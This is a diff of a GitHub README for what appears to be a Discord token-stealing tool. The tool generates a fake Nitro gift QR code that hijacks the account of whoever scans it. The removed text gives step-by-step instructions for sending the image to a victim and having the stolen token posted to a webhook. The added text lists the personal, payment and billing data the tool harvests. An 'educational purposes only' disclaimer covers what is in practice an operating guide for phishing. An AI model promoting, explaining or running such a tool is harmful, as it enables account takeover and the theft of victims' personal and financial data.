@@ -1,30 +1,89 @@
-# Updated Grabber Here: https://github.com/9P9/Website-Token-Grabber-2
+# Discord QR Token Logger
 
+[![forthebadge](https://forthebadge.com/images/badges/made-with-python.svg)](https://forthebadge.com)
+[![forthebadge](http://forthebadge.com/images/badges/built-with-love.svg)](http://forthebadge.com)
 
-# QR Discord Token Grabber
-A python script that generates a scam nitro QR code which can grab a victim's authentication token if scanned. Developed to show how social engineering is performed; use for educational purposes only.
+![GitHub](https://img.shields.io/github/license/9P9/Discord-QR-Token-Logger)
+![GitHub contributors](https://img.shields.io/github/contributors/9P9/Discord-QR-Token-Logger)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=shields)](http://makeapullrequest.com)
+![GitHub repo size](https://img.shields.io/github/repo-size/9P9/Discord-QR-Token-Logger)
+![GitHub issues](https://img.shields.io/github/issues/9P9/Discord-QR-Token-Logger)
+![GitHub pull requests](https://img.shields.io/github/issues-pr/9P9/Discord-QR-Token-Logger)
 
-![img1](https://i.ibb.co/BL2Q0jz/Screenshot-527.png)
+A python script that generates a scam nitro QR code which can grab a victim's authentication token if scanned. Developed to show how social engineering is performed. **For Educational Purposes Only**.
 
-## Demonstration
+![Capture d’écran 2022-08-27 172232](https://user-images.githubusercontent.com/38190847/187040712-92f4c796-c655-47a2-abb2-7f4519d1dab7.png)
 
-![qr-code](https://user-images.githubusercontent.com/75003671/117522092-fd79ff80-afe3-11eb-938c-23dd68d5927c.gif)
+*If you're interested in knowing the powerlevel configuration to get this prompt, have a look at [this repo](https://github.com/billythegoat356/pystyle).*
 
-## Usage
-1. This project requires [Python >= 3.7.6](https://python.org). When installing Python, make sure to check the *ADD TO PATH* checkbox.
+# Table of contents
 
-2. Run the `[1] install_requirements.bat` file.
+- [Usage](#usage)
+  - [Without Discord features](#without-discord-features)
+  - [With Discord features](#with-discord-features)
+- [Installation](#installation)
+  - [Dependencies](#dependencies)
+- [Contributing](#contributing)
+- [License](#license)
 
-3. Unzip the `browser.7z` file so that the browser folder is in the same directory as the `[2] run.bat` file.
+# 📈Usage
 
-4. Run the `[2] run.bat` file.
+To use the script, you just need to launch it normally without updating any code line ! However there is **2 way** to use the script :
 
-5. Input your discord webhook link (this link is used to post the authentication token to a channel). Note that, even if you do not input a webhook link, you will still receive the token when it is printed to the console, but note that you will lose this token once the program is closed!
+- [Without Discord features](#with)
+- [With Discord features](#with-Discord-webhook-url)
 
-6. Wait for `discord_gift.png` to be generated. Then, send the image to a victim for them to scan it. Note that the QR code is only valid for approximately two minutes after creation.
+## Without Discord features
 
-7. When the QR code is scanned, you will be logged onto their account and receive their discord authentication token.
+Without discord features, you can only get target token, you must proceed as follows:
 
-## Need extra help?
+![image](https://user-images.githubusercontent.com/38190847/187048296-dd4b9c75-7c4d-476c-8cba-9c53a809d610.png)
 
-[Join the discord server for support!](https://discord.gg/a24Sp9bEXu)
+## With Discord features
+
+To use Discord features you will need to provide **webhook url** to prompt when requested:
+
+![image](https://user-images.githubusercontent.com/38190847/187048386-1abda0d0-afa9-4a0a-a351-4e55b34398e7.png)
+
+With this method you are able to get much more target information like:
+
+- User token informations :
+  - 👑 Username
+  - 📧 Mail 
+  - 📞 Phone 
+  - 🤑 Nitro 
+- Payment info :
+  - 💳 Brand (Visa/Mastecard/paypal)
+  - ℹ/📩 Last 4 or paypal mail
+  - 📅 Expiration
+- Billing adress :
+  - 📛 Name
+  - ⚡ Line 1
+  - ❄ Line 2
+  - 🏳 Country
+  - 🚩 State
+  - 🏙 City
+  - 📮 Postal code
+
+# 🛠Installation
+
+For installation, you may need some dependencies,
+You may need to follow these steps to avoid all python interpreter errors.
+
+## Dependencies
+
+- Chrome, **be sure to have the lattest version**.
+- Python 9 or above
+- Python module (launch **install_requirements.bat**)
+
+After following all instructions, you can start the script 🥳.
+
+# 💡Contributing
+
+Your contributions are always welcome! Please have a look at the [contribution guidelines](CONTRIBUTING.md) first. 🎉
+
+**Working on your first Pull Request?** You can learn how from this *free* series [How to Contribute to an Open Source Project on GitHub](https://kcd.im/pull-request)
+
+# 📝License
+
+The GNU General Public License v3.0 (GPL-3.0) 2022 - [mouadessalim](https://github.com/mouadessalim) & [9P9](https://github.com/9P9). Please have a look at the [LICENSE](LICENSE) for more details.
